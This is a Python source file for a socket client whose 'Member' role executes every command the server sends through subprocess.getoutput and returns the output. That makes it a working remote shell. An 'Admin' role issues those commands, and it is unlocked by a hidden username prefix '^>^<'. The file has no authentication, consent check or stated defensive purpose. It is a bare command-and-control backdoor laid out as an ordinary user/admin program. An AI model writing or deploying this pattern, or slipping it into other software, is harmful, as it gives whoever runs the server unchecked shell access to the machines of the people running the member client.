import socket
import subprocess
import threading

class User:
    def __init__(self, data):
        self.username = data['data']['username']
        self.is_admin = data['data']['admin']

class Member(User):
    def __init__(self, host, port, data):
        super().__init__(data)
        self.s = socket.socket()
        self.host = host
        self.port = port

    def connect(self):
        self.s.connect((self.host, self.port))
        self.s.send(f'member:{self.username}'.encode())
        print("Member connected to Server.")

    def run(self):
        while True:
            command = self.s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            if command.lower() == 'input':
                prompt = self.s.recv(1024).decode()
                user_input = input(prompt)
                self.s.send(user_input.encode())
            else:
                output = subprocess.getoutput(command)
                self.s.send(output.encode())
        self.s.close()

class Admin(User):
    def __init__(self, host, port, data):
        super().__init__(data)
        self.s = socket.socket()
        self.host = host
        self.port = port

    def connect(self):
        self.s.connect((self.host, self.port))
        self.s.send(f'admin:{self.username}'.encode())
        print("Admin connected to Server.")

    def run(self):
        while True:
            command = input("Enter Command: ")
            if command.lower() == 'exit':
                self.s.send('exit'.encode())
                break
            self.s.send(command.encode())
            if command.lower() == 'input':
                prompt = input("Enter prompt for member: ")
                self.s.send(prompt.encode())
                user_input = self.s.recv(1024).decode()
                print(f"Member input: {user_input}")
            else:
                output = self.s.recv(1024).decode()
                print(output)
        self.s.close()

def main():
    host = "127.0.0.1"
    port = 8080

    username = input("Enter username: ").strip()
    if username.startswith("^>^<"):
        role = 'admin'
        username = username[4:]  # Remove the ^>^< prefix
    else:
        role = 'member'

    data = {
        'data': {
            'username': username,
            'admin': 1 if role == 'admin' else 0
        }
    }

    user = User(data)
    if user.is_admin:
        admin = Admin(host, port, data)
        admin.connect()
        admin.run()
    else:
        member = Member(host, port, data)
        member.connect()
        member.run()

if __name__ == "__main__":
    main()